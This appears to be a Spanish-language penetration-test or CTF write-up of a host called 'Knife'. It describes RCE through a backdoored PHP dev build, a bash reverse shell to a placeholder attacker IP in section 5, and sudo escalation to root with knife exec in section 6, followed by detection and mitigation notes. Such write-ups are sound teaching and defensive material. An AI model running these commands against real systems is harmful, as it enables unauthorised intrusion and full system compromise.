# Informe de Seguridad - Evaluación de Host "Knife"

## 1. Resumen Ejecutivo

Se identificó una vulnerabilidad crítica en PHP 8.1.0-dev que permite ejecución remota de código sin autenticación.

Posteriormente, se abusó de permisos sudo para escalar privilegios a root.

### Impacto

- RCE sin autenticación  
- Acceso al sistema  
- Escalada a root  

### Riesgo: **CRÍTICO**

---

## 2. Enumeración

    nmap -p- -sS --min-rate 5000 -Pn <IP>

Puertos:

- 22 – SSH  
- 80 – HTTP  

---

## 3. Análisis

Cabecera HTTP:

    PHP/8.1.0-dev

→ versión vulnerable con backdoor  

---

## 4. Explotación

RCE mediante cabecera manipulada.

Resultado:

- Usuario: james  

---

## 5. Reverse shell

    nc -lvnp 4444

    bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1

---

## 6. Escalada de privilegios

    sudo -l

Resultado:

    (root) NOPASSWD: /usr/bin/knife

Exploit:

    echo "system('/bin/bash')" > exploit.rb
    sudo /usr/bin/knife exec exploit.rb

Resultado:

    uid=0(root)

---

## 7. Visión SOC

### IoC

- Cabeceras HTTP anómalas  
- Ejecución de comandos desde Apache  
- Reverse shell  
- Uso de sudo  

---

### Logs

    /var/log/apache2/access.log
    /var/log/syslog
    /var/log/auth.log

---

### MITRE

- T1190  
- T1059  
- T1068  

---

## 8. Recomendaciones

- No usar versiones dev  
- Revisar sudo  
- Monitorizar ejecución de comandos  

---

## 9. Conclusión

Cadena:

1. RCE  
2. Shell  
3. Escalada  

Compromiso total del sistema.
